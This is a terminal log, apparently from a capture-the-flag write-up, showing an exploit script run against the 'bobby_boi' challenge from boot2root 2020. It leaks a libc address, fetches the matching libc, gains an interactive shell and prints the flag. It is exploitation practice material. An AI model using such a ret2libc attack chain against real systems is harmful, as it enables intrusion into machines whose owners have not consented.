```shell
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/bobby_boi/bobby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './bobby_boi'
[*] puts: 0x7fefaaaee6a0
[*] libc_url: https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so
[*] getting: https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so
[*] '/pwd/datajerk/boot2root2020/bobby_boi/libc6_2.23-0ubuntu11.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fefaaa7f000
[*] Switching to interactive mode
$ cat flag
b00t2root{y3Ah_Ye4h_b0bbY_b0y_H3_B3_f33l1n_H1m5elf_SG9taWNpZGU=}
```
